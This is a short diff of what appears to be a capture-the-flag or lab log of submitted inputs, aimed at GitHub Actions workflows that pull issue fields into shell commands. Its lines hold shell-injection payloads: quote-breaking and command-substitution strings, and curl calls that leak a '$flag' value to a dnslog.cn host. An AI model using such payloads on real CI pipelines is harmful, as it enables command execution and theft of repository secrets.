@@ -692,3 +692,5 @@ lcl-367:fda";curl fkssbb.sxhx72.dnslog.cn;curl $flag.sxhx72.dnslog.cn;curl ${{ s
 Psyduck0409:${{ github.event.issue.number }} $( flag )
 ";echo `ls`"
 Ha1f00L:${{ github.event.issue.number }}
+Ha1f00L:${{ github.event.issue.number }} $( flag )
+";echo ls"
